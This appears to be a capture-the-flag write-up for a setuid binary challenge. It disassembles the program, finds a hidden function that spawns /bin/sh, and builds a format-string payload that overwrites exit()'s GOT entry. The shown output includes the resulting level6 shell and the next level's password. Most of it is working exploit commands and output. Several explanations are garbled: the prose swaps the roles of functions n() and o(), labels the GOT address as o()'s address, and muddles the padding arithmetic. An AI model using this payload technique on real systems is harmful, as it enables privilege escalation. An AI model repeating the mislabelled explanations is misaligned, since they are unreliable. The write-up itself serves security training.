```shell
$> ls -la
[...]
-rwsr-s---+ 1 level6 users  5385 Mar  6  2016 level5
[...]

$> ./level5
input:  test
output: test

# program asks for input and shows it back
```

```shell
$> objdump -d -M intel level5
[...]
080484a4 <o>:       #1
    [...]
    80484aa:       c7 04 24 f0 85 04 08    mov    DWORD PTR [esp],0x80485f0
    80484b1:       e8 fa fe ff ff          call   80483b0 <system@plt>
    [...]
[...]
080484c2 <n>:       #2
    [...]
    80484e5:       e8 b6 fe ff ff          call   80483a0 <fgets@plt>
    [...]
    80484f3:       e8 88 fe ff ff          call   8048380 <printf@plt>
    [...]
    80484ff:       e8 cc fe ff ff          call   80483d0 <exit@plt>
[...]
08048504 <main>:    #3
    [...]
    804850a:       e8 b3 ff ff ff          call   80484c2 <n>
    [...]
[...]

#1: function o() call system("/bin/sh)
#2: fuction n() call fgets(buffer), printf(buffer) and exit(1
#3: function main() call n()
```

No one function calls n() where the funtion n() contents system("/bin/sh") to execute the shell.
So here we need to found the way to call n().
Use printf() vulnerability to change exit() and replace it with n().

```shell
$> gdb -q level5
(gdb) info functions    #1
[...]
0x080484a4  o
[...]

(gdb) disas n           #2
[...]
0x080484ff <+61>:    call   0x80483d0 <exit@plt>
[...]

(gdb) disas 0x80483d0   #3
0x080483d0 <+0>:     jmp    *0x8049838
[...]

#1: to know the address of the function o()
#2: to know the address of the function exit() (.plt)
#3: to know the address of the function exit() called (.got.plt)

$> ./level5
aaaa %p %p %p %p %p %p %p %p %p %p
aaaa 0x200 0xb7fd1ac0 0xb7ff37d0 0x61616161 [...]

# the offset value is at the 4th position.

$> python -c "print '\x38\x98\x04\x08' + '%134513824d%4\$n'" > /tmp/exploit

# '\x38\x98\x04\x08': address of the function o()
# 134513824: 0x8049838 (hex) -> 134513828 (dec) and 134513828 - 4 = 134513824 (padding)
# %4\$n: fixed offset to the 4th position

$> cat /tmp/exploit - | ./level5
[...] 512
whoami
level6
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```